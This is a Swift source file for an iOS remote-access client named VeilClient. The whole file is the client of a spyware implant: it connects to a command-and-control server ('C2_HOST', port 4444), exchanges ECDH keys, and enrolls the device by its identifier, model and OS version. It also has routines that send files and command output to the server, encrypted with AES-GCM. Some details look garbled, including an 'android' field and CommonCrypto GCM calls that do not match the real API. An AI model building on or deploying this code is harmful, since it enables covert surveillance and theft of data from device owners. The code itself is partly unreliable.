import Foundation
import UIKit
import CommonCrypto

class VeilClient: NSObject, StreamDelegate {
    static let shared = VeilClient()
    let HOST = Bundle.main.object(forInfoDictionaryKey: "C2_HOST") as? String ?? "127.0.0.1"
    let PORT = 4444
    let ENROLL_KEY = Bundle.main.object(forInfoDictionaryKey: "ENROLL_KEY") as? String ?? "default_enroll"
    var inputStream: InputStream?, outputStream: OutputStream?
    var uid = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
    var receiveBuffer = Data()
    var aesKey: [UInt8] = []

    func connect() {
        Stream.getStreamsToHost(withName: HOST, port: PORT, inputStream: &inputStream, outputStream: &outputStream)
        guard let inStream = inputStream, let outStream = outputStream else { return }
        inStream.delegate = self; outStream.delegate = self
        inStream.schedule(in: .current, forMode: .common); outStream.schedule(in: .current, forMode: .common)
        inStream.open(); outStream.open()
        performKeyExchange()
    }

    func performKeyExchange() {
        guard let outStream = outputStream, let inStream = inputStream else { return }
        guard let privateKey = SecKeyCreateRandomKey([kSecAttrKeyType: kSecAttrKeyTypeECSECPrimeRandom, kSecAttrKeySizeInBits: 256] as CFDictionary, nil) else { return }
        guard let pubKey = SecKeyCopyPublicKey(privateKey), let pubData = SecKeyCopyExternalRepresentation(pubKey, nil) as Data? else { return }
        var len = UInt32(pubData.count).bigEndian
        _ = outStream.write(Data(bytes: &len, count: 4).withUnsafeBytes { $0.baseAddress! }, maxLength: 4)
        _ = outStream.write([UInt8](pubData), maxLength: pubData.count)
        var lbuf = [UInt8](repeating: 0, count: 4)
        _ = inStream.read(&lbuf, maxLength: 4)
        let skLen = Int(lbuf.withUnsafeBytes { $0.load(as: UInt32.self).bigEndian })
        var skBuf = [UInt8](repeating: 0, count: skLen)
        _ = inStream.read(&skBuf, maxLength: skLen)
        guard let sk = SecKeyCreateWithData(Data(skBuf) as CFData, [kSecAttrKeyType: kSecAttrKeyTypeECSECPrimeRandom, kSecAttrKeyClass: kSecAttrKeyClassPublic] as CFDictionary, nil) else { return }
        guard let sh = SecKeyCopyKeyExchangeResult(privateKey, sk, [:] as CFDictionary, nil) as Data? else { return }
        aesKey = Array(sh.prefix(32))
        sendJson(["type": "enroll", "enrollKey": ENROLL_KEY, "uid": uid, "model": UIDevice.current.model, "manufacturer": "Apple", "android": UIDevice.current.systemVersion])
    }

    func sendJson(_ payload: [String: Any]) {
        guard let outStream = outputStream, let json = try? JSONSerialization.data(withJSONObject: payload) else { return }
        let enc = aesEncrypt([UInt8](json))
        var len = UInt32(enc.count).bigEndian
        _ = outStream.write(Data(bytes: &len, count: 4).withUnsafeBytes { $0.baseAddress! }, maxLength: 4)
        _ = outStream.write(enc, maxLength: enc.count)
    }

    func aesEncrypt(_ data: [UInt8]) -> [UInt8] {
        var iv = [UInt8](repeating: 0, count: 12)
        SecRandomCopyBytes(kSecRandomDefault, 12, &iv)
        var cryptor: CCCryptorRef?
        CCCryptorCreateWithMode(CCEncrypt, kCCModeGCM, kCCAlgorithmAES, ccNoPadding, iv, aesKey, aesKey.count, nil, 0, 0, 0, &cryptor)
        var out = [UInt8](repeating: 0, count: data.count)
        var moved = 0
        CCCryptorUpdate(cryptor!, data, data.count, &out, out.count, &moved)
        var tag = [UInt8](repeating: 0, count: 16)
        CCCryptorGCMFinal(cryptor!, &tag, tag.count)
        CCCryptorRelease(cryptor!)
        return iv + tag + out
    }

    func sendFile(name: String, data: Data, fileType: String) { sendJson(["type": "file", "uid": uid, "name": name, "size": data.count, "file_type": fileType, "data": data.base64EncodedString()]) }
    func sendResult(cmd: String, output: Any) { sendJson(["type": "result", "uid": uid, "cmd": cmd, "output": output]) }

    func stream(_ aStream: Stream, handle eventCode: Stream.Event) {
        if eventCode == .hasBytesAvailable, let inStream = inputStream {
            var buf = [UInt8](repeating: 0, count: 4096)
            let n = inStream.read(&buf, maxLength: 4096)
            if n > 0 { receiveBuffer.append(buf, count: n); processFrames() }
        }
    }

    func processFrames() {
        while receiveBuffer.count >= 4 {
            let len = Int(receiveBuffer[0..<4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian })
            guard len <= 67108864, receiveBuffer.count >= 4 + len else { break }
            let enc = Array(receiveBuffer.subdata(in: 4..<(4+len)))
            receiveBuffer.removeFirst(4+len)
            let dec = aesDecrypt(enc)
            if let json = try? JSONSerialization.jsonObject(with: Data(dec)) as? [String: Any] { DispatchQueue.global().async { self.handleCommand(json) } }
        }
    }

    func aesDecrypt(_ data: [UInt8]) -> [UInt8] {
        let iv = Array(data[0..<12]), tag = Array(data[12..<28]), ct = Array(data[28...])
        var cryptor: CCCryptorRef?
        CCCryptorCreateWithMode(CCDecrypt, kCCModeGCM, kCCAlgorithmAES, ccNoPadding, iv, aesKey, aesKey.count, nil, 0, 0, 0, &cryptor)
        CCCryptorGCMAddTag(cryptor!, tag, tag.count)
        var out = [UInt8](repeating: 0, count: ct.count)
        var moved = 0
        CCCryptorGCMDecrypt(cryptor!, ct, ct.count, &out, out.count, &moved)
        CCCryptorRelease(cryptor!)
        return out
    }

    func handleCommand(_ msg: [String: Any]) {
        guard let cmd = msg["cmd"] as? String else { return }
        if cmd == "shell" { sendResult(cmd: cmd, output: "iOS shell not available") }
    }
}
